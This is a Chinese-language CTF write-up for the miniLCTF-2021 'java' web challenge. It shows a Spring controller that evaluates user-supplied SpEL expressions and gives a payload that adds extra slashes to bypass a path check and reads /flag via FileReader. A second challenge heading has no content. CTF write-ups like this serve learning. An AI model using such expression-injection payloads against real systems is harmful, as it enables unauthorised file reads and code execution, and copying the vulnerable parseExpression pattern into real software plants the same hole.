# Web

## 1. [miniLCTF-2021] java

源代码：

```java
package com.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.net.MalformedURLException;

@RestController
public class MainController {
    ExpressionParser parser = new SpelExpressionParser();


    @RequestMapping("/")
    public String main(HttpServletRequest request,@RequestParam(required = false) String code,@RequestParam(required = false) String url) throws MalformedURLException {
        String requestURI = request.getRequestURI();
        if(requestURI.equals("/")){
            return "nonono";
        }
        else{
            if (code!=null) {
                String s = parser.parseExpression(code).getValue().toString();
                return s;
            } else {
                return "so?";
            }
        }
    }
}
```

需要绕过第一个if判断，进入到else里面通过`parser.parseExpression(code).getValue().toString();`来执行命令来获取flag，构造payload：

```
/////?code=(new java.io.BufferedReader(new java.io.FileReader("/flag"))).readLine()
```

即可获得flag

## 2. [miniLCTF-2023] mini_java

